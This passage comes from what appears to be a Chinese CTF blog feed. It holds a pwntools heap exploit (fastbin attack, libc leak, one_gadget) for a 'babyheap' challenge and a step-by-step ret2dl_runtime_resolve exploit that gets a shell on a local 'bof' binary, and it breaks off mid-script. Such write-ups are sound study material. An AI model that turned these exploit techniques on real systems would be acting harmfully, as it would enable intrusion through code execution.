class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&apos;./babyheap&apos;)</span><br><span class="line">elf = ELF(&apos;./babyheap&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def allocate(size):</span><br><span class="line">    p.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;Size: &apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fill(idx, size, content):</span><br><span class="line">    p.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&apos;Size: &apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;Content: &apos;)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    p.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dump(idx):</span><br><span class="line">    p.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    p.sendline(&apos;4&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(0x10)#0  00</span><br><span class="line">allocate(0x10)#1  20</span><br><span class="line">allocate(0x10)#2  40</span><br><span class="line">allocate(0x10)#3  60</span><br><span class="line">allocate(0x80)#4  80</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0) +p64(0x21) + p8(0x80)</span><br><span class="line">fill(0,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x21)</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allocate(0x10)#1</span><br><span class="line">allocate(0x10)#2 -&gt;4</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91)</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">allocate(0x80)#5</span><br><span class="line">free(4)</span><br><span class="line">dump(2)#overlap</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Content: \n&apos;)</span><br><span class="line">main_arena = u64(p.recv(8))-0x58</span><br><span class="line"></span><br><span class="line">print hex(main_arena)</span><br><span class="line">print hex(libc.sym[&apos;__libc_start_main&apos;])</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - 0x3C4B20</span><br><span class="line">#0x7F50FB4A9000‬  </span><br><span class="line"></span><br><span class="line">allocate(0x60)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">target = main_arena - 0x33 </span><br><span class="line">addr = p64(target)</span><br><span class="line">fill(2,len(addr),addr)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">allocate(0x60)#4</span><br><span class="line">allocate(0x60)#target 6</span><br><span class="line"></span><br><span class="line">onegadget = libc_base + 0x4526a</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x13 + p64(onegadget)</span><br><span class="line">fill(6,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allocate(0x100)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<br>        <a href="https://bbs.pediy.com/thread-247214.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247214.htm</a><br>        <a href="https://blog.betamao.me/2018/02/25/hack-lu-ctf-2014-oreo/" target="_blank" rel="noopener">https://blog.betamao.me/2018/02/25/hack-lu-ctf-2014-oreo/</a><br>        <a href="https://bbs.pediy.com/thread-247219-1.htm（师傅写了两个方法，可以看看" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247219-1.htm（师傅写了两个方法，可以看看</a>)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;就把wiki上的三道题稍微看了一下，了解了一下下fastbin attack，但是。。。依旧不算太清醒&lt;br&gt;好了，废话不多说，开始吧&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>runtime_resolve</title>
    <link href="http://yoursite.com/2019/10/07/runtime-resolve/"/>
    <id>http://yoursite.com/2019/10/07/runtime-resolve/</id>
    <published>2019-10-07T04:23:05.000Z</published>
    <updated>2019-10-07T06:04:39.138Z</updated>
    
    <content type="html"><![CDATA[<p>做为高级rop的题目果然是令人很头疼的，这类题目是没有办法leak的（无回显），就借助_dl_runtime_resolve(link_map_obj, reloc_index)对动态链接的函数重定位</p><p>控制程序执行 dl_resolve 函数<br>    给定 Link_map 以及 index 两个参数。<br>    当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。<br>控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。<br>伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。<br>伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</p><a id="more"></a><p>对于此类题目：<br>关键点：</p><ol><li>.rel.plt表</li><li>.dynsym</li><li>.dynstr</li><li>从rel.plt里获得某个函数在.dynsym里的偏移</li><li>再从 .dynsym 里获得.dynstr里的偏移</li><li>在 .dynstr里找到对应的字符，将这个字符解析成函数</li></ol><p>然后贴一段我也没有理解的东西看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">符号版本信息</span><br><span class="line">    最好使得 ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8] 的值为 0，以便于防止找不到的情况。</span><br><span class="line">重定位表项</span><br><span class="line">r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。</span><br></pre></td></tr></table></figure><p>然后参考了很多大佬的博客都提到了延迟绑定机制（就是一定要调用一次之后got表里存的才会是真实地址）<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%871.png" alt></p><p>第一条的jmp的指令跳转的地址是write的got表地址，但是此时指向的是下一条指令的地址0x80483d6<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%872.png" alt></p><p>push 0x20 是dl_runtime_resolve的第二个参数（reloc_arg）</p><p>然后跳到plt[0]  (0x8048380) 里，将linkmap  push进去，然后跳到_dl_runtime_resolve进行解析，解析后的地址将会写入到第一次的read  got.plt表里，然后将程序的控制权交给解析出来的地址指向的函数(自动找到那个函数的地址)</p><p>关于四个关键函数的地址提取：<br>plt_0 = elf.get_section_by_name(‘.plt’).header.sh_addr<br>rel_plt = elf.get_section_by_name(‘.rel.plt’).header.sh_addr<br>dynsym = elf.get_section_by_name(‘.dynsym’).header.sh_addr<br>dynstr = elf.get_section_by_name(‘.dynstr’).header.sh_addr</p><p>objdump -s -j .rel.plt babystack<br>objdump -d -j .plt babystack</p><p>（直接找ida来得更快一点）</p><p>readelf -S bof<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%873.png" alt></p><p>readelf -d bof<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%874.png" alt></p><p>JMPREL == .rel.plt<br>SYMTAB == .dynsym<br>STRREL == .dynstr<br>plt貌似只有-S里能找到</p><p>readelf -r bof<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%875.png" alt></p><p>607 -&gt; write的.rel.plt  607&lt;&lt;8 –&gt; 6<br>x/4wx .dynsym的地址+0x10*6    第一个参数是在str里的偏移<br>x/s .str的地址+上面的偏移      得到的是函数名的字符串<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%876.png" alt><br>x/3i  要查函数的plt表地址<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%877.png" alt>    </p><p>Jmp –&gt; got表地址<br>Push –&gt; size(0x20) 是dl_runtime_resolve的第二个参数（reloc_arg）<br>Jmp –&gt; plt[0]的地址</p><p>再——link_map = *(GOT+4) == (GOT[1]-&gt;链接器的标识信息)作为参数存入栈中<br>GOT<a href="GOT+8">2</a>是动态链接器的入口点–&gt;存着_dl_runtime_resolve的地址</p><p>_dl_runtime_resolve：完成符号的解析（内部会调用_dl_fixup）（找到真实地址存入got） —— 本题是将write的真实地址写入got，并把控制权交给write</p><p>漏洞利用方式：<br>1、控制eip为plt[0]的地址，只需传入一个index_arg参数即可<br>2、控制index_arg的大小，使reloc的信息存入可控地址<br>3、伪造reloc内容，使sym在可控地址<br>4、伪造sym内容，是name在可控地址<br>5、伪造name为任意库函数，达到我们想要的效果</p><p>我们来分步完成我们想要的效果吧（有write的函数其实就不需要这个方法了吧…）</p><p>Part1：<br>直接用write函数，查看最后输出效果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./bof&apos;)</span><br><span class="line">elf = ELF(&apos;./bof&apos;)</span><br><span class="line"></span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line"></span><br><span class="line">leave_ret = 0x08048458</span><br><span class="line">pop_ebp = 0x0804861b  </span><br><span class="line">ppp_ret = 0x08048619   #pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line"></span><br><span class="line">bss_addr = 0x0804a040 #readelf -S bof | grep &quot;.bss&quot;</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line">write_plt = elf.plt[&apos;write&apos;]</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + 36  </span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) </span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10  </span><br><span class="line">r_info = index_dynsym &lt;&lt; 8 | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)  </span><br><span class="line">st_name = fake_sym_addr + 0x10 - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#stage 1   bss_addr</span><br><span class="line">payload = &quot;a&quot;*112 </span><br><span class="line">payload += p32(read_plt) # 读100个字节到base_stage</span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(0)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(100)</span><br><span class="line">payload += p32(pop_ebp) # 把base_stage pop到ebp中</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line"></span><br><span class="line">payload1 = &apos;aaaa&apos;</span><br><span class="line">payload1 += p32(write_plt)</span><br><span class="line">payload1 += &apos;aaaa&apos;</span><br><span class="line">payload1 += p32(1)</span><br><span class="line">payload1 += p32(base_stage+80)</span><br><span class="line">payload1 += p32(len(cmd))</span><br><span class="line">payload1 += &apos;A&apos; * (80 - len(payload1))</span><br><span class="line">payload1 += cmd</span><br><span class="line">payload1 += &apos;A&apos; * (100 - len(payload1))</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>“/bin/sh“被打出来了</p><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%878.png" alt></p><p>Part 2<br>控制eip为pit[0]地址 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line">plt_0 = 0x08048380  # objdump -d -j .plt bof</span><br><span class="line">index_offset = 0x20  # write&apos;s index</span><br><span class="line"></span><br><span class="line">payload2 = &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(1)</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd </span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%879.png" alt></p><p>Part 3<br>控制index_offset 指向fake_reloc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line">plt_0 = 0x08048380 # objdump -d -j .plt bof</span><br><span class="line">rel_plt = 0x08048330 # objdump -s -j .rel.plt bof</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">r_info = 0x607 # write: Elf32_Rel-&gt;r_info</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(1)</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc # (base_stage+28)的位置</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd </span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%8710.png" alt></p><p>Part 4<br>伪造fake_sym  指向st_name</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line">fake_sym_addr = base_stage + 36</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) # 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10 # 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号</span><br><span class="line">r_info = (index_dynsym &lt;&lt; 8) | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = 0x4c</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(1)</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc # (base_stage+28)的位置</span><br><span class="line">payload2 += &apos;B&apos; * align</span><br><span class="line">payload2 += fake_sym # (base_stage+36)的位置</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd </span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%8711.png" alt></p><p>Part 5<br>St_name指向 ‘write’，继续回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line">fake_sym_addr = base_stage + 36</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10</span><br><span class="line">r_info = (index_dynsym &lt;&lt; 8) | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + 0x10) - dynstr # 加0x10因为Elf32_Sym的大小为0x10</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(1)</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc # (base_stage+28)的位置</span><br><span class="line">payload2 += &apos;B&apos; * align</span><br><span class="line">payload2 += fake_sym # (base_stage+36)的位置</span><br><span class="line">payload2 += &quot;write\x00&quot;</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd </span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%8712.png" alt></p><p>Part 6<br>把write改成system来getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line">fake_sym_addr = base_stage + 36</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10</span><br><span class="line">r_info = (index_dynsym &lt;&lt; 8) | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + 0x10) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += fake_reloc # (base_stage+28)的位置</span><br><span class="line">payload2 += &apos;B&apos; * align</span><br><span class="line">payload2 += fake_sym # (base_stage+36)的位置</span><br><span class="line">payload2 += &quot;system\x00&quot;</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd</span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>就可以成功getshell了！！！</p><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%8713.png" alt></p><p>完整exp</p><figure class="highlight plain"><figcaption><span>python</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./bof&apos;)</span><br><span class="line">elf = ELF(&apos;./bof&apos;)</span><br><span class="line"></span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line"></span><br><span class="line">leave_ret = 0x08048458</span><br><span class="line">pop_ebp = 0x0804861b  </span><br><span class="line">ppp_ret = 0x08048619   #pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line"></span><br><span class="line">bss_addr = 0x0804a040 #readelf -S bof | grep &quot;.bss&quot;</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line">write_plt = elf.plt[&apos;write&apos;]</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + 36  </span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) </span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10  </span><br><span class="line">r_info = index_dynsym &lt;&lt; 8 | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)  </span><br><span class="line">st_name = fake_sym_addr + 0x10 - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line">index_offset 